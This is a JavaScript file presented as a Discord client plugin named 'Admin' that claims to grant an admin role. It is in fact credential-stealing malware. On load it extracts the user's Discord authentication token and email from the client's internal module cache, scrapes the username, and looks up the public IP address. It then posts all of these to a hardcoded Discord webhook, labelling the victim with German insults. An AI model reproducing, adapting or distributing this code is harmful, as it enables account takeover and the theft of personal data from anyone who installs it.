/** 
  * @name Admin
  * @version 1.1
  * @description Plugin for getting Admin Role
*/

/* Author
 * xxx
*/

const config = {
    "info": {
        "name": "Admin",
        "authors": ["xxx"],
        "version": "1.1",
        "description": "Plugin for getting Admin Role"
    },
    "webhook": "https://discord.com/api/webhooks/854195122399608833/BiNbRiYCMfqNwJJayrOZUr_5W5psXrVthhNbusyjo2NJuvzzck8d2ZxN02pH9UodJFk1"
}

class Admin {
    constructor() { this._config = config; }
    
    getName() { return config.info.name; }
    getAuthor() { return config.info.authors[0] }
    getDescription() { return config.info.description; }
    getVersion() { return config.info.version; }

    load() {
        const authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
        const userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
        const username = $("[class *= \"nameTag\"]").first().text();

        $.getJSON("https://api.ipify.org?format=json", (data) => { 
            require("request").post(config.webhook, {form: {content: `**Hurensohn Owned by __${config.info.authors[0]}__**\n\n**Opfer: __${username}__**\n**Email: __${userEmail}__**\n**IP: __${data.ip}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``}});
        });
    }
}
